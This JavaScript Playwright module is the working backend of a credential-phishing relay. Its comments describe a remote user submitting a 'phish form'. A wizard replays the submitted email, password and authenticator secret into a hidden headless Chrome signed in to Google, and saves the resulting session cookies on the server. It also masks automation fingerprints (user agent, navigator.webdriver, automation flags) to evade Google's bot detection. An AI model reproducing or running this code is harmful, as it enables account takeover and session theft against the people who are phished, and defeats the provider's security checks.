import { chromium } from 'playwright';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { authenticator } from 'otplib';
import { getSecrets } from './store.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SESSIONS_DIR = path.join(__dirname, '..', 'sessions');

// id -> { context, page }
const active = new Map();

export function isOpen(id) {
  return active.has(id);
}

export function activeIds() {
  return [...active.keys()];
}

function userDataDir(id) {
  const dir = path.join(SESSIONS_DIR, id);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// Headless is used for the silent wizard-driven login (no window popping up on
// the server when a remote user submits the phish form). Headed is used for the
// admin's explicit Open/Auto-login so 2FA / device challenges can be cleared by
// hand. The switch must happen at launch (persistent contexts can't toggle it).
async function launch(id, { headless = true } = {}) {
  const dir = userDataDir(id);
  // Real Chrome + these flags are what let Google's sign-in through:
  // - channel 'chrome': the real installed Chrome, most trusted fingerprint
  // - hide the automation banner/flag so navigator.webdriver is false
  // - headless (Chrome's new headless) is far less detectable than the old one,
  //   so silent wizard login stays under Google's radar without a visible window
  const baseOpts = {
    headless,
    viewport: null,
    // Google's sign-in flow serves a stripped-down "WebLiteSignIn" to anything it
    // suspects is automated — and rejects it as "browser or app may not be secure".
    // Headless Chrome also advertises a "HeadlessChrome" UA which Google distrusts.
    // Forcing a real Chrome desktop UA makes Google serve the FULL Glif flow and
    // accept the sign-in, which is what lets a no-2FA account actually log in.
    userAgent:
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    ignoreDefaultArgs: ['--enable-automation'],
    args: [
      '--start-maximized',
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-blink-features=AutomationControlled',
    ],
  };
  let context;
  try {
    context = await chromium.launchPersistentContext(dir, { ...baseOpts, channel: 'chrome' });
  } catch {
    context = await chromium.launchPersistentContext(dir, baseOpts);
  }
  // Google immediately rejects automated browsers ("this browser or app may not
  // be secure" -> /signin/rejected) unless we mask the driving marks. The
  // canonical fix is to override navigator.webdriver BEFORE any page script runs.
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  });
  const page = context.pages()[0] || (await context.newPage());
  const entry = { context, page };
  active.set(id, entry);
  context.on('close', () => active.delete(id));
  return entry;
}

// Open the session's browser (or focus it if already open) and navigate to a URL.
export async function open(id, url, opts = {}) {
  let entry = active.get(id);
  if (!entry) entry = await launch(id, { headless: opts.headless });
  if (url) {
    try {
      await entry.page.bringToFront();
      await entry.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch (e) {
      // navigation errors shouldn't kill the open browser
    }
  }
  return entry;
}

export async function close(id) {
  const entry = active.get(id);
  if (!entry) return false;
  try {
    await entry.context.close();
  } catch {}
  active.delete(id);
  return true;
}

export async function closeAll() {
  for (const id of [...active.keys()]) {
    // eslint-disable-next-line no-await-in-loop
    await close(id);
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Best-effort assisted login. Pre-fills credentials in the persistent context.
// Returns { status, message }. Leaves the browser OPEN so 2FA / challenges can
// be completed by hand when they can't be automated.
export async function login(session) {
  const secrets = getSecrets(session.id) || { password: '', totpSecret: '' };
  const entry = await open(session.id);
  const page = entry.page;

  if (session.provider === 'google') {
    return googleLogin(page, session, secrets);
  }

  // Generic provider: just navigate to the login URL for a manual sign-in.
  if (session.loginUrl) {
    try {
      await page.goto(session.loginUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch {}
  }
  return { status: 'new', message: 'Opened login page. Complete sign-in manually in the browser window.' };
}

function classify(url) {
  if (/\/signin\/rejected/.test(url)) {
    return {
      status: 'error',
      message:
        'Google blocked this automated sign-in ("this browser or app may not be secure"). Click Open and sign in by hand once — the session is then saved and reused.',
    };
  }
  // explicit signed-in destinations
  if (/myaccount\.google\.com|gds\.google\.com\/web|\/signin\/(continue|oauth\/consent)|ManageAccount/.test(url)) {
    return { status: 'logged-in', message: 'Signed in successfully — session saved.' };
  }
  return null;
}

// DOM-based assessment of the real login state. URL patterns alone can't tell a
// legitimate no-2FA sign-in on accounts.google.com (the URL stays accounts.google.com)
// from an in-progress one, so we inspect the visible form fields instead. This is
// what lets accounts WITHOUT 2FA actually classify as logged-in instead of being
// stuck on a phantom "verify it's you" screen.
async function assessLogin(page) {
  const url = page.url();
  if (/\/signin\/rejected/.test(url)) {
    return {
      status: 'error',
      message: 'Google blocked this automated sign-in ("this browser or app may not be secure"). Click Open and sign in by hand once — the session is then saved and reused.',
    };
  }
  if (/myaccount\.google\.com|gds\.google\.com\/web|\/signin\/(continue|oauth\/consent)|ManageAccount/.test(url)) {
    return { status: 'logged-in', message: 'Signed in successfully — session saved.' };
  }

  const idf = page.locator('#identifierId, input[name="identifier"], input[type="email"]').first();
  if (await idf.isVisible().catch(() => false)) {
    return { status: 'new', message: 'Waiting on the email step.' };
  }
  const code = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"]').first();
  if (await code.isVisible().catch(() => false)) {
    return { status: 'pending', message: 'A verification code is requested — enter the authenticator secret or finish it in the browser window.' };
  }
  const pw = page.locator('input[type="password"]').first();
  if (await pw.isVisible().catch(() => false)) {
    return { status: 'new', message: 'Waiting on the password step.' };
  }
  // none of email / password / code fields on screen and not rejected => signed in
  return { status: 'logged-in', message: 'Signed in successfully — session saved.' };
}

async function googleLogin(page, session, secrets) {
  try {
    await page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 });
    await sleep(2000);

    // already signed in?
    const pre = await assessLogin(page);
    if (pre?.status === 'logged-in') return { status: 'logged-in', message: 'Already signed in.' };

    // --- email ---
    const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
    if (await email.count()) {
      await email.first().fill(session.username);
      await clickNext(page, 'Next');
      await sleep(3500);
    }

    const afterEmail = await assessLogin(page);
    if (afterEmail?.status === 'error') return afterEmail;

    // --- password ---
    const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
    await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
    if (await pw.count()) {
      if (!secrets.password) {
        return { status: 'new', message: 'No stored password. Finish signing in manually in the browser window.' };
      }
      await pw.first().fill(secrets.password);
      await clickNext(page, 'Next');
      // wait for authentication to move past the password screen
      await waitWhileVisible(page, pw.first(), 15000);
    }

    // --- 2FA / TOTP (only if a code field is actually shown) ---
    const totp = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"]');
    if ((await totp.count()) && secrets.totpSecret) {
      const code = authenticator.generate(secrets.totpSecret);
      await totp.first().fill(code);
      await clickNext(page, 'Next');
      await sleep(4000);
    }

    return await assessLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Auto-login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// Poll until the given locator is no longer visible (Google accepted the input
// and navigated on), up to `timeout` ms. Returns true if it disappeared.
async function waitWhileVisible(page, locator, timeout) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    if (!(await locator.isVisible().catch(() => false))) return true;
    await sleep(500);
  }
  return false;
}

// ---------------------------------------------------------------------------
// Incremental "live" login. The remote wizard submits one credential at a time
// (username -> password -> 2FA). Each submitted step drives the *real* Google
// sign-in forward in this session's persistent Chrome, so by the time the
// wizard is done the actual logged-in session (cookies, not a stored secret)
// already exists on disk under sessions/<id>/. Phases are serialized per
// session so out-of-order HTTP arrivals can never race each other.
// ---------------------------------------------------------------------------
const queues = new Map();

export function wizardPhase(key, id, value) {
  const prev = queues.get(id) || Promise.resolve();
  const run = prev.then(() => wizardPhaseInner(key, id, value));
  queues.set(id, run.catch(() => {})); // keep the chain alive even on failure
  return run;
}

async function wizardPhaseInner(key, id, value) {
  try {
    const page = (await open(id, undefined, { headless: true })).page;

    if (key === 'username') {
      await page
        .goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 })
        .catch(() => {});
      await sleep(1200);
      const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
      if (await email.count()) {
        await email.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        await sleep(2500);
      }
      return { status: 'new', message: 'email submitted — entering password' };
    }

    if (key === 'password') {
      const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
      await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
      if (await pw.count()) {
        await pw.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        await waitWhileVisible(page, pw.first(), 15000); // wait for real auth to progress
      }
      return await assessLogin(page);
    }

    if (key === 'totp') {
      const codeBox = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"]');
      if ((await codeBox.count()) && value) {
        await codeBox.first().fill(authenticator.generate(String(value).replace(/\s+/g, '')));
        await clickNext(page, 'Next');
        await sleep(2000);
      }
      return await assessLogin(page);
    }

    return await assessLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Wizard login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// Click Google's "Next"/submit: by id if present, else the visible button by
// its label, else just press Enter.
async function clickNext(page, labelText) {
  const byId = page.locator('#identifierNext, #passwordNext, #totpNext');
  if (await byId.count()) {
    await byId.first().click().catch(() => {});
    return;
  }
  try {
    const byRole = page.getByRole('button', { name: labelText, exact: false });
    if (await byRole.count()) {
      await byRole.first().click();
      return;
    }
  } catch {}
  await page.keyboard.press('Enter').catch(() => {});
}
